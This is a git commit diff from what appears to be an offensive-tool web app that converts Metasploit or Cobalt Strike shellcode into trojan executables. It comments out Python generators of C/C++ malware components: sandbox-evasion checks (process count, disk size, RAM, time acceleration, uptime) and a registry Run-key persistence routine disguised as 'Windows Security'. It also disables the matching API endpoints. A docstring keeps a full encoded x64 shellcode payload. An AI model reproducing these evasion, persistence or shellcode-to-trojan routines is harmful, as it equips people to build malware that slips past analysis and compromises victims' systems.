de4de570eaf8983f94e33a9cea3adda8f406a50d
ascotbe <869335729@qq.com>
2021-12-21 10:10:42 +0800

    v1.0.105:palm_tree:

--- Web/TrojanOrVirus/TrojanClass.py
+++ Web/TrojanOrVirus/TrojanClass.py
@@ -1,220 +1,220 @@
-from ClassCongregation import randoms
-
-class AntiSandbox: #所有语言反沙箱的集合
-    """
-    返回数据：
-    1.函数名
-    2.导入的包（C/C++可以重复导入包
-    3.函数代码
-    注意事项：
-    所有需要随机化的参数统一使用：_xxxx_ 命名方式，防止随机化错误
-    """
-    def __init__(self):
-        self.__Method__=[]
-
-        for i in dir(self):
-            if not i.startswith("_"):
-                self.__Method__.append(i)
-    def NumberOfProcesses2c(self):
-        """
-        适用于C/C++代码
-        用来判断当前进程是否低于40个，目前见过能模拟最多进程的是WD能模拟39个
-        """
-        FunctionName=randoms().EnglishAlphabet(20)
-        Include="#include <tlhelp32.h>\n"
-        Code="""
-void """+FunctionName+"""()
-{
-	HANDLE _hSnapshot_ = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	if (INVALID_HANDLE_VALUE == _hSnapshot_)
-	{
-		return;
-	}
-	PROCESSENTRY32 _PE_ = { sizeof(_PE_) };
-	int _Procnum_ = 0;
-	for (BOOL ret = Process32First(_hSnapshot_, &_PE_); ret; ret = Process32Next(_hSnapshot_, &_PE_))
-	{
-		_Procnum_++;
-	}
-	if (_Procnum_ <= 40)  //判断当前进程是否低于40个，目前见过能模拟最多进程的是WD能模拟39个
-	{
-		exit(1);
-	}
-}
-        """
-        OriginalString=["_hSnapshot_","_Procnum_","_PE_"]
-        for i in OriginalString:#进行循环处理随机字符串
-            Code = Code.replace(i, randoms().EnglishAlphabet(15))
-        return Include,FunctionName+"();\n",Code+"\n"
-    def CheckHardDisk2c(self):
-        """
-        适用于C/C++代码
-        进行检测硬盘的大小，小于40G的直接退出
-        """
-        FunctionName = randoms().EnglishAlphabet(20)
-        Include = "#include <string>\n"
-        Code = """
-void """ + FunctionName + """()
-{
-    int _AllTotal_ = 0; 
-    int _AllFree_ = 0;
-    DWORD _dwSize_ = MAX_PATH;
-    TCHAR _szLogicalDrives_[MAX_PATH] = { 0 };
-    DWORD _dwResult_ = GetLogicalDriveStrings(_dwSize_, _szLogicalDrives_);
-    if (_dwResult_ > 0 && _dwResult_ <= MAX_PATH)
-    {
-        TCHAR* _szSingleDrive_ = _szLogicalDrives_;
-        while (*_szSingleDrive_)
-        {
-            uint64_t _available_, _total_, _free_;
-            if (GetDiskFreeSpaceEx(_szSingleDrive_, (ULARGE_INTEGER*)&_available_, (ULARGE_INTEGER*)&_total_, (ULARGE_INTEGER*)&_free_))
-            {
-                uint64_t _Total_, _Available_, _Free_;
-                _Total_ = _total_ >> 20;
-                _Available_ = _available_ >> 20;
-                _Free_ = _free_ >> 20;
-
-                _AllTotal_ += _Total_;   //总
-                _AllFree_ += _Free_;   //剩余
-            }
-
-            // 获取下一个驱动器号起始地址
-            _szSingleDrive_ += strlen(_szSingleDrive_) + 1;
-        }
-    }
-    //判断硬盘是否小于40
-    //cout << _AllTotal_ /1024 << endl;
-    if ((_AllTotal_ / 1024) < 40)
-    {
-        exit(1);
-    }
-}
-        """
-        OriginalString=["_AllTotal_","_AllFree_","_dwSize_","_szSingleDrive_","_szLogicalDrives_","_dwResult_","_available_","_total_","_free_","_Total_", "_Available_", "_Free_"]#存放需要随机化的字符
-        for i in OriginalString:#进行循环处理随机字符串
-            Code = Code.replace(i, randoms().EnglishAlphabet(15))
-        return Include,FunctionName+"();\n",Code+"\n"
-
-    def CheckReadAndMemory2c(self):
-        """
-        适用于C/C++代码
-        进行检测运行内存的大小，小于2G的直接退出
-        """
-        FunctionName = randoms().EnglishAlphabet(20)
-        Include = "#include <string>\n"
-        Code = """
-void """ + FunctionName + """()
-{
-	SYSTEM_INFO _SystemInfo_;
-	GetSystemInfo(&_SystemInfo_);//获取系统信息
-	// check RAM
-	MEMORYSTATUSEX _MemoryStatus_;
-    _MemoryStatus_.dwLength = sizeof(_MemoryStatus_);
-	GlobalMemoryStatusEx(&_MemoryStatus_);
-	DWORD _RAMMB_ = _MemoryStatus_.ullTotalPhys / 1024 / 1024;
-	//std::cout << RAMMB << std::endl;
-	if (_RAMMB_ < 2048)
-	{
-		exit(1);
-	}
-}
-        """
-        OriginalString=["_SystemInfo_","_MemoryStatus_","_RAMMB_"]
-        for i in OriginalString:#进行循环处理随机字符串
-            Code = Code.replace(i, randoms().EnglishAlphabet(15))
-        return Include,FunctionName+"();\n",Code+"\n"
-    def TimeAcceleratedJudgment2c(self):
-        """
-        适用于C/C++
-        检查时间流动性
-        """
-        FunctionName = randoms().EnglishAlphabet(20)
-        Include = "#include <ctime>\n"
-        Code = """
-void """ + FunctionName + """()
-{
-    clock_t _ClockStartTime_, _ClockEndTime_;
-    time_t _UnixStartTime_ = time(0);
-    //std::cout << "_UnixStartTime_:" << _UnixStartTime_ << std::endl;
-    _ClockStartTime_ = clock();
-    Sleep(10000);//暂停10秒
-    _ClockEndTime_ = clock();
-    time_t _UnixEndTime_ = time(0);
-    //std::cout << "StartTime:" << _ClockStartTime_ << std::endl;
-    //std::cout << "EndTime:" << _ClockEndTime_ << std::endl;
-
-    //std::cout << "_UnixEndTime_:" << _UnixEndTime_ << std::endl;
-    int _iTimeDifference_ = ((_UnixEndTime_ - _UnixStartTime_) * 1000) - (_ClockEndTime_ - _ClockStartTime_);
-    if (_iTimeDifference_ > 150)
-    {
-        exit(1);
-    }
-}
-        """
-        OriginalString=["_ClockStartTime_","_ClockEndTime_","_UnixStartTime_","_UnixEndTime_","_iTimeDifference_"]
-        for i in OriginalString:#进行循环处理随机字符串
-            Code = Code.replace(i, randoms().EnglishAlphabet(15))
-        return Include,FunctionName+"();\n",Code+"\n"
-    def CheckRunningTime2c(self):
-        """
-        适用于C/C++
-        检测系统运行时间，如果刚开机的一半来说有可能是沙箱
-        """
-        FunctionName = randoms().EnglishAlphabet(20)
-        Include = ""
-        Code = """
-void """ + FunctionName + """()
-{
-	ULONGLONG _uptime_ = GetTickCount64() / 1000;
-	//std::cout << _uptime_;
-	//秒钟数
-	if (_uptime_ < 1200)
-	{
-		exit(1);
-	}
-}
-"""
-        OriginalString=["_uptime_"]
-        for i in OriginalString:#进行循环处理随机字符串
-            Code = Code.replace(i, randoms().EnglishAlphabet(15))
-        return Include,FunctionName+"();\n",Code+"\n"
-
-class AutoStart: #所有语言的自启动代码
-    """
-    返回数据：
-    1.函数名
-    2.导入的包（C/C++可以重复导入包
-    3.函数代码
-    注意事项：
-    所有需要随机化的参数统一使用：_xxxx_ 命名方式，防止随机化错误
-    """
-    def __init__(self):
-        self.__Method__=[]
-
-        for i in dir(self):
-            if not i.startswith("_"):
-                self.__Method__.append(i)
-    def CurrentVersionRun2c(self):
-        """
-        适用于C/C++
-        最常见的注册表启动类
-        """
-        FunctionName = randoms().EnglishAlphabet(20)
-        Include = ""
-        Code = """
-void """ + FunctionName + """()
-{
-	HKEY _hKey_;
-	char _Currentpath_[256] = { 0 };
-	GetModuleFileNameA(NULL, _Currentpath_, 256);
-	if (!RegCreateKeyA(HKEY_CURRENT_USER, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", &_hKey_))
-	{
-		RegSetValueExA(_hKey_, "Windows Security", 0, REG_SZ, (PUCHAR)_Currentpath_, strlen(_Currentpath_));
-		RegCloseKey(_hKey_);
-	}
-}
-        """
-        OriginalString=["_hKey_","_Currentpath_"]
-        for i in OriginalString:#进行循环处理随机字符串
-            Code = Code.replace(i, randoms().EnglishAlphabet(15))
-        return Include,Include,FunctionName+"();\n",Code+"\n"
+# from ClassCongregation import randoms
+#
+# class AntiSandbox: #所有语言反沙箱的集合
+#     """
+#     返回数据：
+#     1.函数名
+#     2.导入的包（C/C++可以重复导入包
+#     3.函数代码
+#     注意事项：
+#     所有需要随机化的参数统一使用：_xxxx_ 命名方式，防止随机化错误
+#     """
+#     def __init__(self):
+#         self.__Method__=[]
+#
+#         for i in dir(self):
+#             if not i.startswith("_"):
+#                 self.__Method__.append(i)
+#     def NumberOfProcesses2c(self):
+#         """
+#         适用于C/C++代码
+#         用来判断当前进程是否低于40个，目前见过能模拟最多进程的是WD能模拟39个
+#         """
+#         FunctionName=randoms().EnglishAlphabet(20)
+#         Include="#include <tlhelp32.h>\n"
+#         Code="""
+# void """+FunctionName+"""()
+# {
+# 	HANDLE _hSnapshot_ = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+# 	if (INVALID_HANDLE_VALUE == _hSnapshot_)
+# 	{
+# 		return;
+# 	}
+# 	PROCESSENTRY32 _PE_ = { sizeof(_PE_) };
+# 	int _Procnum_ = 0;
+# 	for (BOOL ret = Process32First(_hSnapshot_, &_PE_); ret; ret = Process32Next(_hSnapshot_, &_PE_))
+# 	{
+# 		_Procnum_++;
+# 	}
+# 	if (_Procnum_ <= 40)  //判断当前进程是否低于40个，目前见过能模拟最多进程的是WD能模拟39个
+# 	{
+# 		exit(1);
+# 	}
+# }
+#         """
+#         OriginalString=["_hSnapshot_","_Procnum_","_PE_"]
+#         for i in OriginalString:#进行循环处理随机字符串
+#             Code = Code.replace(i, randoms().EnglishAlphabet(15))
+#         return Include,FunctionName+"();\n",Code+"\n"
+#     def CheckHardDisk2c(self):
+#         """
+#         适用于C/C++代码
+#         进行检测硬盘的大小，小于40G的直接退出
+#         """
+#         FunctionName = randoms().EnglishAlphabet(20)
+#         Include = "#include <string>\n"
+#         Code = """
+# void """ + FunctionName + """()
+# {
+#     int _AllTotal_ = 0;
+#     int _AllFree_ = 0;
+#     DWORD _dwSize_ = MAX_PATH;
+#     TCHAR _szLogicalDrives_[MAX_PATH] = { 0 };
+#     DWORD _dwResult_ = GetLogicalDriveStrings(_dwSize_, _szLogicalDrives_);
+#     if (_dwResult_ > 0 && _dwResult_ <= MAX_PATH)
+#     {
+#         TCHAR* _szSingleDrive_ = _szLogicalDrives_;
+#         while (*_szSingleDrive_)
+#         {
+#             uint64_t _available_, _total_, _free_;
+#             if (GetDiskFreeSpaceEx(_szSingleDrive_, (ULARGE_INTEGER*)&_available_, (ULARGE_INTEGER*)&_total_, (ULARGE_INTEGER*)&_free_))
+#             {
+#                 uint64_t _Total_, _Available_, _Free_;
+#                 _Total_ = _total_ >> 20;
+#                 _Available_ = _available_ >> 20;
+#                 _Free_ = _free_ >> 20;
+#
+#                 _AllTotal_ += _Total_;   //总
+#                 _AllFree_ += _Free_;   //剩余
+#             }
+#
+#             // 获取下一个驱动器号起始地址
+#             _szSingleDrive_ += strlen(_szSingleDrive_) + 1;
+#         }
+#     }
+#     //判断硬盘是否小于40
+#     //cout << _AllTotal_ /1024 << endl;
+#     if ((_AllTotal_ / 1024) < 40)
+#     {
+#         exit(1);
+#     }
+# }
+#         """
+#         OriginalString=["_AllTotal_","_AllFree_","_dwSize_","_szSingleDrive_","_szLogicalDrives_","_dwResult_","_available_","_total_","_free_","_Total_", "_Available_", "_Free_"]#存放需要随机化的字符
+#         for i in OriginalString:#进行循环处理随机字符串
+#             Code = Code.replace(i, randoms().EnglishAlphabet(15))
+#         return Include,FunctionName+"();\n",Code+"\n"
+#
+#     def CheckReadAndMemory2c(self):
+#         """
+#         适用于C/C++代码
+#         进行检测运行内存的大小，小于2G的直接退出
+#         """
+#         FunctionName = randoms().EnglishAlphabet(20)
+#         Include = "#include <string>\n"
+#         Code = """
+# void """ + FunctionName + """()
+# {
+# 	SYSTEM_INFO _SystemInfo_;
+# 	GetSystemInfo(&_SystemInfo_);//获取系统信息
+# 	// check RAM
+# 	MEMORYSTATUSEX _MemoryStatus_;
+#     _MemoryStatus_.dwLength = sizeof(_MemoryStatus_);
+# 	GlobalMemoryStatusEx(&_MemoryStatus_);
+# 	DWORD _RAMMB_ = _MemoryStatus_.ullTotalPhys / 1024 / 1024;
+# 	//std::cout << RAMMB << std::endl;
+# 	if (_RAMMB_ < 2048)
+# 	{
+# 		exit(1);
+# 	}
+# }
+#         """
+#         OriginalString=["_SystemInfo_","_MemoryStatus_","_RAMMB_"]
+#         for i in OriginalString:#进行循环处理随机字符串
+#             Code = Code.replace(i, randoms().EnglishAlphabet(15))
+#         return Include,FunctionName+"();\n",Code+"\n"
+#     def TimeAcceleratedJudgment2c(self):
+#         """
+#         适用于C/C++
+#         检查时间流动性
+#         """
+#         FunctionName = randoms().EnglishAlphabet(20)
+#         Include = "#include <ctime>\n"
+#         Code = """
+# void """ + FunctionName + """()
+# {
+#     clock_t _ClockStartTime_, _ClockEndTime_;
+#     time_t _UnixStartTime_ = time(0);
+#     //std::cout << "_UnixStartTime_:" << _UnixStartTime_ << std::endl;
+#     _ClockStartTime_ = clock();
+#     Sleep(10000);//暂停10秒
+#     _ClockEndTime_ = clock();
+#     time_t _UnixEndTime_ = time(0);
+#     //std::cout << "StartTime:" << _ClockStartTime_ << std::endl;
+#     //std::cout << "EndTime:" << _ClockEndTime_ << std::endl;
+#
+#     //std::cout << "_UnixEndTime_:" << _UnixEndTime_ << std::endl;
+#     int _iTimeDifference_ = ((_UnixEndTime_ - _UnixStartTime_) * 1000) - (_ClockEndTime_ - _ClockStartTime_);
+#     if (_iTimeDifference_ > 150)
+#     {
+#         exit(1);
+#     }
+# }
+#         """
+#         OriginalString=["_ClockStartTime_","_ClockEndTime_","_UnixStartTime_","_UnixEndTime_","_iTimeDifference_"]
+#         for i in OriginalString:#进行循环处理随机字符串
+#             Code = Code.replace(i, randoms().EnglishAlphabet(15))
+#         return Include,FunctionName+"();\n",Code+"\n"
+#     def CheckRunningTime2c(self):
+#         """
+#         适用于C/C++
+#         检测系统运行时间，如果刚开机的一半来说有可能是沙箱
+#         """
+#         FunctionName = randoms().EnglishAlphabet(20)
+#         Include = ""
+#         Code = """
+# void """ + FunctionName + """()
+# {
+# 	ULONGLONG _uptime_ = GetTickCount64() / 1000;
+# 	//std::cout << _uptime_;
+# 	//秒钟数
+# 	if (_uptime_ < 1200)
+# 	{
+# 		exit(1);
+# 	}
+# }
+# """
+#         OriginalString=["_uptime_"]
+#         for i in OriginalString:#进行循环处理随机字符串
+#             Code = Code.replace(i, randoms().EnglishAlphabet(15))
+#         return Include,FunctionName+"();\n",Code+"\n"
+#
+# class AutoStart: #所有语言的自启动代码
+#     """
+#     返回数据：
+#     1.函数名
+#     2.导入的包（C/C++可以重复导入包
+#     3.函数代码
+#     注意事项：
+#     所有需要随机化的参数统一使用：_xxxx_ 命名方式，防止随机化错误
+#     """
+#     def __init__(self):
+#         self.__Method__=[]
+#
+#         for i in dir(self):
+#             if not i.startswith("_"):
+#                 self.__Method__.append(i)
+#     def CurrentVersionRun2c(self):
+#         """
+#         适用于C/C++
+#         最常见的注册表启动类
+#         """
+#         FunctionName = randoms().EnglishAlphabet(20)
+#         Include = ""
+#         Code = """
+# void """ + FunctionName + """()
+# {
+# 	HKEY _hKey_;
+# 	char _Currentpath_[256] = { 0 };
+# 	GetModuleFileNameA(NULL, _Currentpath_, 256);
+# 	if (!RegCreateKeyA(HKEY_CURRENT_USER, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", &_hKey_))
+# 	{
+# 		RegSetValueExA(_hKey_, "Windows Security", 0, REG_SZ, (PUCHAR)_Currentpath_, strlen(_Currentpath_));
+# 		RegCloseKey(_hKey_);
+# 	}
+# }
+#         """
+#         OriginalString=["_hKey_","_Currentpath_"]
+#         for i in OriginalString:#进行循环处理随机字符串
+#             Code = Code.replace(i, randoms().EnglishAlphabet(15))
+#         return Include,Include,FunctionName+"();\n",Code+"\n"
--- Web/TrojanOrVirus/TrojanInterface.py
+++ Web/TrojanOrVirus/TrojanInterface.py
@@ -12,7 +12,7 @@ from django.http import JsonResponse,FileResponse
 from Web.Workbench.LogRelated import UserOperationLogRecord,RequestLogRecord
 from Web.celery import app
 from Web.TrojanOrVirus import C2CFuck
-from Web.TrojanOrVirus.TrojanClass import AutoStart,AntiSandbox
+# from Web.TrojanOrVirus.TrojanClass import AutoStart,AntiSandbox
 
 
 Language2Command={
@@ -127,53 +127,6 @@ def GetTrojanPlugins(request):#获取用户当前木马插件
         return JsonResponse({'message': '请使用Post请求', 'code': 500, })
 
 
-"""get_anti_sandbox
-{
-	"token": "xxx"
-}
-"""
-def GetAntiSandbox(request):#获取反沙箱方式
-    RequestLogRecord(request, request_api="get_anti_sandbox")
-    if request.method == "POST":
-        try:
-            Token=json.loads(request.body)["token"]
-            Uid = UserInfo().QueryUidWithToken(Token)  # 如果登录成功后就来查询UID
-            if Uid != None:  # 查到了UID
-                UserOperationLogRecord(request, request_api="get_anti_sandbox", uid=Uid)
-                return JsonResponse({'message': AntiSandbox().__Method__, 'code': 200, })
-            else:
-                return JsonResponse({'message': "小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧", 'code': 403, })
-        except Exception as e:
-            ErrorLog().Write("Web_TrojanOrVirus_TrojanInterface_GetAntiSandbox(def)", e)
-            return JsonResponse({'message': "呐呐呐！莎酱被玩坏啦(>^ω^<)", 'code': 169, })
-
-    else:
-        return JsonResponse({'message': '请使用Post请求', 'code': 500, })
-
-"""get_auto_start
-{
-	"token": "xxx"
-}
-"""
-def GetAutoStart(request):#获取反沙箱方式
-    RequestLogRecord(request, request_api="get_auto_start")
-    if request.method == "POST":
-        try:
-            Token=json.loads(request.body)["token"]
-            Uid = UserInfo().QueryUidWithToken(Token)  # 如果登录成功后就来查询UID
-            if Uid != None:  # 查到了UID
-                UserOperationLogRecord(request, request_api="get_auto_start", uid=Uid)
-                return JsonResponse({'message': AutoStart().__Method__, 'code': 200, })
-            else:
-                return JsonResponse({'message': "小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧", 'code': 403, })
-        except Exception as e:
-            ErrorLog().Write("Web_TrojanOrVirus_TrojanInterface_GetAutoStart(def)", e)
-            return JsonResponse({'message': "呐呐呐！莎酱被玩坏啦(>^ω^<)", 'code': 169, })
-
-    else:
-        return JsonResponse({'message': '请使用Post请求', 'code': 500, })
-
-
 """shellcode_to_trojan
 {
 	"token": "xxx",
@@ -181,8 +134,6 @@ def GetAutoStart(request):#获取反沙箱方式
 	"shellcode_type": "1",
 	"shellcode_architecture": "x64",
 	"plugin":"1631074271-Cpp-EXE-Windows-Null-Yes-CreateThreatPoolWait.yaml",
-	"auto_start_function":[],
-	"anti_sandbox_function":["NumberOfProcesses2c"],
 	"shellcode":"\\x48\\x31\\xc9\\x48\\x81\\xe9\\xc4\\xff\\xff\\xff\\x48\\x8d\\x05\\xef\\xff\\xff\\xff\\x48\\xbb\\xa0\\xa2\\xe9\\xe1\\xd3\\xa2\\xe2\\x2f\\x48\\x31\\x58\\x27\\x48\\x2d\\xf8\\xff\\xff\\xff\\xe2\\xf4\\xe8\\x93\\x20\\xa9\\x52\\x4b\\x2b\\xd0\\x5f\\x5d\\xa1\\x6c\\xd6\\x4d\\x1d\\xd0\\x5f\\xea\\x52\\xf9\\x05\\xa4\\x17\\xc1\\x0d\\x5b\\x63\\xa9\\xe2\\xfa\\xc5\\x67\\x8d\\x5a\\x16\\x1e\\x2c\\x40\\x16\\x7f\\x47\\x6d\\x54\\x8e\\x97\\x95\\x97\\xc8\\x89\\xec\\x91\\x0a\\x91\\xa4\\x97\\xc8\\x3e\\x1f\\xd2\\x85\\x3a\\x62\\x17\\x97\\xf5\\xa1\\x54\\x3e\\x26\\x7c\\x20\\x1a\\x8e\\x5b\\xe3\\xf0\\x9c\\xaf\\xee\\x8c\\xfb\\xd5\\xe2\\x46\\x2e\\xa1\\x59\\x42\\x7a\\x10\\x66\\x40\\x02\\xa1\\x59\\xf5\\x89\\xb2\\x4b\\x91\\x31\\x17\\x15\\xc7\\x2c\\xd5\\x52\\xf7\\xda\\x16\\x8b\\x45\\xcd\\x62\\x9c\\x4d\\x09\\x39\\xbf\\x4a\\xb6\\x55\\x39\\x0d\\x1c\\x8e\\x71\\xcb\\x73\\xd1\\x3f\\x2a\\x1c\\x8e\\xc6\\x38\\xdb\\x73\\x7a\\xf0\\xfb\\xba\\x91\\x3e\\xb6\\xe5\\x88\\xf2\\xab\\x5c\\x76\\x7c\\x01\\x2b\\x32\\x21\\x8e\\xe7\\xed\\xee\\x67\\xf6\\x12\\x97\\x39\\x29\\x6c\\x2b\\xe3\\xf0\\x30\\x97\\x39\\x9e\\x9f\\x05\\x05\\xcb\\x6c\\xa6\\x8b\\xc1\\x95\\xee\\xd7\\x47\\xe8\\x20\\xeb\\x2e\\xdb\\x59\\x19\\xfd\\x3b\\x37\\x6d\\x81\\x63\\x98\\x43\\xc8\\x7e\\xcb\\x25\\x43\\xd6\\x29\\xfb\\x5a\\x2f\\x9d\\x6d\\x33\\x55\\x0d\\xe3\\x83\\x2c\\xab\\x6d\\x89\\xd5\\x70\\xe3\\x83\\x2c\\xeb\\x6d\\x89\\xf5\\x38\\xe3\\x07\\xc9\\x81\\x6f\\x4f\\xb6\\xa1\\xe3\\x39\\xbe\\x67\\x19\\x63\\xfb\\x6a\\x87\\x28\\x3f\\x0a\\xec\\x0f\\xc6\\x69\\x6a\\xea\\x93\\x99\\x64\\x53\\xcf\\xe3\\xf9\\x28\\xf5\\x89\\x19\\x4a\\x86\\xb8\\x20\\x88\\xf6\\xcb\\x25\\x02\\xcf\\xed\\x6b\\x7c\\x19\\x83\\x24\\xd2\\xd7\\xe3\\xe3\\x10\\x3a\\x40\\x65\\x22\\xce\\x69\\x7b\\xeb\\x28\\x83\\xda\\xcb\\xc6\\xe3\\x9f\\x80\\x36\\xca\\xf3\\x4f\\xb6\\xa1\\xe3\\x39\\xbe\\x67\\x64\\xc3\\x4e\\x65\\xea\\x09\\xbf\\xf3\\xc5\\x77\\x76\\x24\\xa8\\x44\\x5a\\xc3\\x60\\x3b\\x56\\x1d\\x73\\x50\\x3a\\x40\\x65\\x26\\xce\\x69\\x7b\\x6e\\x3f\\x40\\x29\\x4a\\xc3\\xe3\\xeb\\x14\\x37\\xca\\xf5\\x43\\x0c\\x6c\\x23\\x40\\x7f\\x1b\\x64\\x5a\\xc6\\x30\\xf5\\x51\\x24\\x8a\\x7d\\x43\\xde\\x29\\xf1\\x40\\xfd\\x27\\x05\\x43\\xd5\\x97\\x4b\\x50\\x3f\\x92\\x7f\\x4a\\x0c\\x7a\\x42\\x5f\\x81\\x34\\xda\\x5f\\xcf\\xd2\\xaa\\x08\\x7e\\xcb\\x25\\x02\\x87\\x68\\xe3\\x85\\xf3\\xca\\x24\\x02\\x87\\x29\\x11\\x39\\xf5\\xa4\\xa2\\xfd\\x52\\xd3\\x5b\\xbd\\xdc\\x9d\\x64\\xb8\\x21\\xfd\\x16\\x95\\x81\\x1e\\x6d\\x81\\x43\\x40\\x97\\x0e\\x02\\xc1\\xa5\\xf9\\x67\\x1d\\xae\\xb3\\x39\\xd8\\x57\\x6d\\xed\\x68\\xf2\\x49\\xf7\\x11\\xda\\xd7\\xe4\\x09\\xc7\\x6b\\x50\\xae\\x5d\\x67\\x87\\x68\\xab\\x08\\x7e\\x68\\xe3\\x5e\\x68\\x2f"
 
 }
@@ -198,8 +149,6 @@ def ShellcodeToTrojan(request):##shellcode转换生成病毒
             ShellcodeType = json.loads(request.body)["shellcode_type"] #用来辨别MSF 还是CS
             ShellcodeArchitecture = json.loads(request.body)["shellcode_architecture"]  # 架构类型 X86或者X64
             Plugin = json.loads(request.body)["plugin"]  # 当前shellcode使用的插件
-            AutoStartFunction = json.loads(request.body)["auto_start_function"]# 获取自启动函数，如果空表明不传入
-            AntiSandboxFunction = json.loads(request.body)["anti_sandbox_function"]  # 获取自启动函数，如果空表明不传入
             Uid = UserInfo().QueryUidWithToken(Token)  # 如果登录成功后就来查询UID
             if Uid != None:  # 查到了UID
                 UserOperationLogRecord(request, request_api="shellcode_to_trojan", uid=Uid)
@@ -208,10 +157,6 @@ def ShellcodeToTrojan(request):##shellcode转换生成病毒
                 try:
                     if ShellcodeName=="":#判断是否有名字
                         return JsonResponse({'message': "未传入项目名称！", 'code': 410, })
-                    if not (set(AutoStartFunction) < set(AutoStart().__Method__)):#判断是否是子集，如果是c
-                        return JsonResponse({'message': "传入自启函数并不在可调用列表中ლ(•̀ _ •́ ლ)", 'code': 402, })
-                    elif not (set(AntiSandboxFunction) < set(AntiSandbox().__Method__)):
-                        return JsonResponse({'message': "传入反沙箱函数并不在可调用列表中ლ(•̀ _ •́ ლ)", 'code': 405, })
                     else:
                         if Plugin in PluginList:#判断传入的是否是python插件，并且插件名称是否在列表中
                             try:
@@ -226,43 +171,6 @@ def ShellcodeToTrojan(request):##shellcode转换生成病毒
                                 VirusOriginalFilePath = TempFilePath + RandomName + "." +SourceFileSuffix  # 病毒原始文件名，后缀从插件中获取
                                 VirusFileStoragePath = GetTrojanFilePath().Result()  # 病毒文件存放路径
                                 VirusFileGenerationPath = VirusFileStoragePath + RandomName + "." +GenerateFileSuffix  # 病毒文件生成路径
-                                Include=""
-                                FunctionName=""
-                                Code= ""
-                                for x in AutoStartFunction:
-                                    if x.split('2')[-1]=="c" or x.split('2')[-1]=="cpp":
-                                        if SourceFileSuffix=="c" or SourceFileSuffix=="cpp":
-                                            continue
-                                    elif x.split('2')[-1] !=SourceFileSuffix:#获取语言类型进行判断
-                                        return JsonResponse({'message': "自启动函数代码与插件语言类型不符ლ(•̀ _ •́ ლ)", 'code': 406, })
-                                for q in AntiSandboxFunction:
-                                    if q.split('2')[-1] == "c" or q.split('2')[-1] == "cpp":
-                                        if SourceFileSuffix == "c" or SourceFileSuffix == "cpp":
-                                            continue
-                                    elif q.split('2')[-1] != SourceFileSuffix:  # 获取语言类型进行判断
-                                        return JsonResponse({'message': "反沙盒函数代码与插件语言类型不符ლ(•̀ _ •́ ლ)", 'code': 407, })
-
-                                try:
-                                    for w in AutoStartFunction:  # 进行动态调用
-                                        Return=getattr(AutoStart(), w)()#动态调用类中的方法
-                                        Include+=Return[0]
-                                        FunctionName+=Return[1]
-                                        Code+=Return[2]
-                                except Exception as e:
-                                    ErrorLog().Write(
-                                        "Web_TrojanOrVirus_TrojanInterface_ShellcodeToTrojan(def)-AutoStartFunction-getattr", e)
-                                    return JsonResponse({'message': "呐呐呐！AutoStartFunction中getattr函数错误~", 'code': 408, })
-                                try:
-                                    for e in AntiSandboxFunction:  # 进行动态调用
-                                        Return=getattr(AntiSandbox(), e)()#动态调用类中的方法
-                                        Include+=Return[0]
-                                        FunctionName+=Return[1]
-                                        Code+=Return[2]
-                                except Exception as e:
-                                    ErrorLog().Write(
-                                        "Web_TrojanOrVirus_TrojanInterface_ShellcodeToTrojan(def)-AntiSandboxFunction-getattr", e)
-                                    return JsonResponse({'message': "呐呐呐！AntiSandboxFunction中getattr函数错误~", 'code': 409, })
-
                                 #需要判断语言类型然后对应不同的生成方式
                                 if sys.platform == "win32":
                                     # windows的暂时没测试
@@ -404,7 +312,54 @@ def TrojanFileDownloadVerification(request):#木马文件下载验证接口
         return JsonResponse({'message': '请使用Get请求', 'code': 500, })
 
 
-#import importlib
+
+# """get_anti_sandbox
+# {
+# 	"token": "xxx"
+# }
+# """
+# import importlib
+# def GetAntiSandbox(request):#获取反沙箱方式
+#     RequestLogRecord(request, request_api="get_anti_sandbox")
+#     if request.method == "POST":
+#         try:
+#             Token=json.loads(request.body)["token"]
+#             Uid = UserInfo().QueryUidWithToken(Token)  # 如果登录成功后就来查询UID
+#             if Uid != None:  # 查到了UID
+#                 UserOperationLogRecord(request, request_api="get_anti_sandbox", uid=Uid)
+#                 return JsonResponse({'message': AntiSandbox().__Method__, 'code': 200, })
+#             else:
+#                 return JsonResponse({'message': "小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧", 'code': 403, })
+#         except Exception as e:
+#             ErrorLog().Write("Web_TrojanOrVirus_TrojanInterface_GetAntiSandbox(def)", e)
+#             return JsonResponse({'message': "呐呐呐！莎酱被玩坏啦(>^ω^<)", 'code': 169, })
+#
+#     else:
+#         return JsonResponse({'message': '请使用Post请求', 'code': 500, })
+#
+# """get_auto_start
+# {
+# 	"token": "xxx"
+# }
+# """
+# def GetAutoStart(request):#获取反沙箱方式
+#     RequestLogRecord(request, request_api="get_auto_start")
+#     if request.method == "POST":
+#         try:
+#             Token=json.loads(request.body)["token"]
+#             Uid = UserInfo().QueryUidWithToken(Token)  # 如果登录成功后就来查询UID
+#             if Uid != None:  # 查到了UID
+#                 UserOperationLogRecord(request, request_api="get_auto_start", uid=Uid)
+#                 return JsonResponse({'message': AutoStart().__Method__, 'code': 200, })
+#             else:
+#                 return JsonResponse({'message': "小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧", 'code': 403, })
+#         except Exception as e:
+#             ErrorLog().Write("Web_TrojanOrVirus_TrojanInterface_GetAutoStart(def)", e)
+#             return JsonResponse({'message': "呐呐呐！莎酱被玩坏啦(>^ω^<)", 'code': 169, })
+#
+#     else:
+#         return JsonResponse({'message': '请使用Post请求', 'code': 500, })
+#
 # def ShellcodeToTrojan(request):#shellcode转换生成病毒
 #     RequestLogRecord(request, request_api="shellcode_to_trojan")
 #     if request.method == "POST":
